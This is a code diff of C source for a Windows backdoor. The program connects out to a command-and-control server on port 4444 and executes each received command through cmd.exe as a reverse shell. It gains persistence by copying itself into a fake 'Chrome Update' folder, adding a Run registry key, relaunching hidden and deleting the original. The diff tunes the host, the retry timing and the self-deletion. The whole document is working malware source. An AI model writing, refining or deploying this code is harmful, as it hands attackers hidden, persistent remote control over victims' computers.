@@ -8,19 +8,26 @@
 //link to use winsock2
 #pragma comment(lib, "Ws2_32.lib")
 #define BUFFER_SIZE 1024
-#define TIME_WAIT 3000
-#define HOST  L"0.0.0.0"
+#define TIME_WAIT 30000
+#define HOST  L"127.0.0.1"
 #define PORT  L"4444"
 #define PROMPT "cmd: "
 
 
-void setup();
+void install();
 SOCKET connectServer();
 
 int main(int argc, char** argv) {
 
-	setup();
-	
+	if (argc == 1)
+	{
+		install();
+		return 0;
+	}
+
+	Sleep(10000);
+	DeleteFileA(argv[1]);
+
 	SOCKET sock = INVALID_SOCKET;
 
 	while ((sock=connectServer()) == INVALID_SOCKET) {
@@ -30,18 +37,21 @@ int main(int argc, char** argv) {
 	}
 	
 	printf("Connect to C&C\n");
-	//loop
+
 	int ret;
 	char command[BUFFER_SIZE];
 	wchar_t commandLine[BUFFER_SIZE];
 	STARTUPINFO startupInfo;
 	PROCESS_INFORMATION procInfo;
+
+	//loop to recv command
 	while (1) {
+
 		//send msg to receive cmd 
 		ret = send(sock, PROMPT, strlen(PROMPT), 0);
 		if (ret == SOCKET_ERROR) {
 
-			printf("send failed");
+			printf("send failed\n");
 			break;
 		}
 
@@ -49,12 +59,12 @@ int main(int argc, char** argv) {
 		ret = recv(sock, command, BUFFER_SIZE * 2, 0);
 		if (ret == SOCKET_ERROR) {
 
-			printf("recv failed");
+			printf("recv failed\n");
 			break;
 		}
 		else if (ret == 0) {
 
-			printf("The peer server closed");
+			printf("The peer server closed\n");
 			break;
 		}
 		command[ret] = NULL;
@@ -76,7 +86,7 @@ int main(int argc, char** argv) {
 		if (!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", commandLine,
 			NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &procInfo)) {
 
-			printf("Cant create process");
+			printf("Cant create process\n");
 			break;
 
 		}
@@ -86,6 +96,7 @@ int main(int argc, char** argv) {
 		CloseHandle(procInfo.hProcess);
 	
 	}
+
 	WSACleanup();
 	closesocket(sock);
 
@@ -112,7 +123,7 @@ SOCKET connectServer() {
 	hints.ai_protocol = IPPROTO_TCP;
 
 	if (GetAddrInfoW(HOST,PORT, &hints, &result)) {
-		printf("Can't get server adddress information");
+		printf("Can't get server adddress information\n");
 		WSACleanup();
 		return INVALID_SOCKET;
 	}
@@ -130,7 +141,7 @@ SOCKET connectServer() {
 
 	if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
 	{
-		printf("Can't connect to server");
+		printf("Can't connect to server, try connecting after each 30s\n");
 		closesocket(sock);
 		FreeAddrInfo(result);
 		WSACleanup();
@@ -142,7 +153,7 @@ SOCKET connectServer() {
 }
 
 //persistence
-void setup() {
+void install() {
 	wchar_t currentPath[BUFFER_SIZE];
 	wchar_t destPath[BUFFER_SIZE];
 	PWSTR homeDir;
@@ -150,12 +161,12 @@ void setup() {
 	//get full file path
 	if (!GetModuleFileName(NULL, currentPath, BUFFER_SIZE)) {
 
-		printf("Cant get current file path");
+		printf("Cant get current file path\n");
 		return;
 
 	}
 
-	if (wcsstr(currentPath, L"\\.Chrome\\Chrome Update\\backdoor.exe")) {
+	if (wcsstr(currentPath, L"\\.Chrome\\ChromeUpdate\\backdoor.exe")) {
 
 		return;
 
@@ -170,41 +181,56 @@ void setup() {
 
 	}
 
-	StringCchPrintf(destPath, BUFFER_SIZE, L"%s\\.Chrome\\Chrome Update", homeDir);
+	StringCchPrintf(destPath, BUFFER_SIZE, L"%s\\.Chrome\\ChromeUpdate", homeDir);
 
 	//create dir
-	SHCreateDirectory(NULL, destPath);
+	SHCreateDirectoryEx(NULL, destPath, NULL);
+	StringCbCat(destPath, BUFFER_SIZE, L"\\backdoor.exe\0");
 
-	StringCbCat(destPath, BUFFER_SIZE, L"\\backdoor.exe");
 
 	//move to hide (replace if already exits and make a copy if cant move)
-	if (!MoveFileEx(currentPath, destPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED)) {
-
-		printf("Cant move file");
+	if (!CopyFile(currentPath, destPath, FALSE)) {
+		
+		printf("Cant move file\n");
 		return;
-
 	}
-	//hidden file
-	if (!SetFileAttributes(destPath, FILE_ATTRIBUTE_HIDDEN)){
-
-		printf("Cant set file hidden attribute");
-		return;
 	
-	}
-
 	HKEY hRunKey = NULL;
 
 	//persistence
 	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-		0, KEY_SET_VALUE, &hRunKey)){ //KEY_SET_VALUE: Required to create, delete, or set a registry value.
+		0, KEY_SET_VALUE, &hRunKey) != ERROR_SUCCESS){ //KEY_SET_VALUE: Required to create, delete, or set a registry value.
 	
-		printf("Cant open registry key");
+		printf("Cant open registry key\n");
 		return;
 	}
-	if (RegSetValueEx(hRunKey, L"Chrome Update", 0, REG_SZ, (const BYTE*)destPath, wcslen(destPath))== ERROR_SUCCESS) {
 
-		printf("Cant set value under registry key");
+	wchar_t cmd[1024];
+	StringCchPrintf(cmd, BUFFER_SIZE, L"%s %s", destPath, currentPath);
+
+	if (RegSetValueEx(hRunKey, L"ChromeUpdate ", 0, REG_SZ, (CONST BYTE*)cmd, sizeof(wchar_t) * wcslen(cmd)) != ERROR_SUCCESS) {
+
+		printf("Cant set value under registry key\n");
 		return;
 	}
 	RegCloseKey(hRunKey);
+	
+	STARTUPINFO startupInfo;
+	PROCESS_INFORMATION procInfo;
+	ZeroMemory(&startupInfo, sizeof(startupInfo));
+	ZeroMemory(&procInfo, sizeof(procInfo));
+
+
+	startupInfo.wShowWindow = SW_HIDE;
+	startupInfo.cb = sizeof(startupInfo);
+
+
+	if (!CreateProcessW(NULL, (LPWSTR)cmd,
+		NULL, NULL, TRUE, 0,
+		NULL, NULL,
+		&startupInfo, &procInfo)) {
+
+		printf("Cant create process\n");
+		return;
+	}
 }
